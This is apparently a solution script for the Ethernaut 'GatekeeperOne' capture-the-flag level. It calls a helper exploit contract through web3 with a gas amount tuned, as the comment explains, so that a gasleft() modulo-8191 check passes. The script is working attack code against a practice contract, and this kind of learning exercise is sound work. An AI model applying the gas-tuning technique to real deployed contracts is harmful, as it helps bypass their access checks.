
const contractAddr = "0xbeC5F8daD540C2e6b533DA004104dCA267E568B8";

const Exploit = new web3.eth.Contract([
    {
        "inputs": [
            {
                "internalType": "uint256",
                "name": "gasAmount",
                "type": "uint256"
            }
        ],
        "name": "exploit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "gatekeeper",
        "outputs": [
            {
                "internalType": "contract IGatekeeperOne",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
], contractAddr);

// we can get to 24827 + 8191 * k using a debugger, in my case Remix IDE
// I started by entering the gasUsed from a failed enter() call, which was
// 24684. gasleft(), then, returned 24430 at gateTwo(), and so I needed to
// add (8191 - (24430 % 8191)) = 143 to the gas amount -> 24684 + 143 = 24827.

await Exploit.methods.exploit(24827).send({ from: player, gas: 1000000 });
